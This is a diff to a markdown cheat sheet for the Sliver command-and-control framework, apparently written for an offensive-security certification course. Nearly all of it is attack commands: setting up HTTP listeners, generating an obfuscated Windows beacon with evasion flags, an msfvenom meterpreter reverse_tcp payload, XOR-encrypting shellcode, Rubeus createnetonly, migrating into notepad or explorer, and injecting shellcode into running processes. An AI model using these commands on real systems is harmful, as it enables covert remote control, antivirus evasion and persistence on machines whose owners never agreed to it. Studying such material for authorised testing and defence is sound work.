@@ -286,7 +286,7 @@ http -L 10.10.10.11 --lport 8099
 
 ### Payloads
 
-To be used with files in the `payloads` directory: https://github.com/Anon-Exploiter/sliver-cheatsheet/tree/main/payloads
+To be used with files in the `payloads` directory: https://github.com/Anon-Exploiter/sliver-cheatsheet/tree/main/payloads - Using the oneliners, you no longer need to later on XOR encrypt your shellcode manually using the course given C# code. 
 
 > XOR encryption with 2
 
@@ -339,6 +339,12 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=5553 EXITFUNC=
 Sliver implant 
 
 ```powershell
+# Create listener (if one doesn't exist already)
+profiles new --http 10.10.10.11:8088 --format shellcode osep
+http -L 10.10.10.11 --lport 8088
+
+
+# Generate beacon .exe
 generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows --seconds 5 --jitter 0 --evasion
 ```
 
@@ -347,7 +353,7 @@ generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows -
 ### Implant Duplication & Migration
 
 ```powershell
-# All same, they all launch in x86, regardless of bins, no difference really - -T for same process token
+# Launch either x64 or x86 version of notepad according to beacon process
 execute C:\\windows\\system32\\notepad.exe
 execute -T notepad
 execute C:\\windows\\SysWOW64\\notepad.exe
@@ -358,11 +364,11 @@ rubeus -t 20 -- createnetonly /program:C:\\windows\\SysWOW64\\notepad.exe
 rubeus -t 20 -- createnetonly /program:C:\\windows\\system32\\cmd.exe
 
 
-# Get process list by (usually last process)
+# Get process pid (usually last process)
 ps -e notepad
 
 
-# Get explorer for stability
+# Get explorer's pid for stability
 ps -e explorer
 
 
@@ -371,7 +377,7 @@ ps -e explorer
 migrate -p 3532
 
 
-# Using -A or without, makes no difference, sliver automatically detects the arch for 32 bit
+# x86 - Using -A or without, makes no difference, sliver automatically detects the arch for 32 bit
 execute-shellcode -A 386 -p 1524 /home/kali/OSEP/hav0c/sliver.x86.bin
 execute-shellcode -p 6896 /home/kali/OSEP/hav0c/sliver.x86.bin
 
